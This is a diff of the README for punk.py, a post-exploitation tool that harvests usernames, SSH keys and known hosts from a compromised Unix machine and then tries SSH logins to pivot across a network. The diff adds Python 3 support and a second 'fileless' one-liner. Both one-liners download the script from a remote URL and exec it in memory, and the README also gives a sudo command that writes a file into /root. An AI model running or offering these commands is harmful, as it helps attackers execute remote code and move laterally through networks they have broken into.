@@ -8,7 +8,7 @@
 
 punk.py is a post-exploitation tool meant to help network pivoting from a compromised unix box.
 It collect usernames, ssh keys and known hosts from a unix system, then it tries to connect via ssh to all the combinations found.
-punk.py is wrote in order to work on standard python2 installations.
+punk.py is wrote in order to work on both standard python2 and python3 interpreters.
 
 
 
@@ -38,9 +38,14 @@ execute commands with sudo:
  ~$ ./punk.py --run "sudo sh -c 'echo iamROOT>/root/hacked.txt'"
 ```
 
-one-liner fileless ( with --no-passwd parameter ):
+python2 one-liner fileless ( with --no-passwd parameter ):
 ```
  ~$ python -c "import urllib2;exec(urllib2.urlopen('https://raw.githubusercontent.com/r3vn/punk.py/master/punk.py').read())" --no-passwd
+```
+
+python3 one-liner fileless ( with --crack parameter ):
+```
+~$ python3 -c "import requests;exec(requests.get('https://raw.githubusercontent.com/r3vn/punk.py/master/punk.py').text)"
 ```
 
 
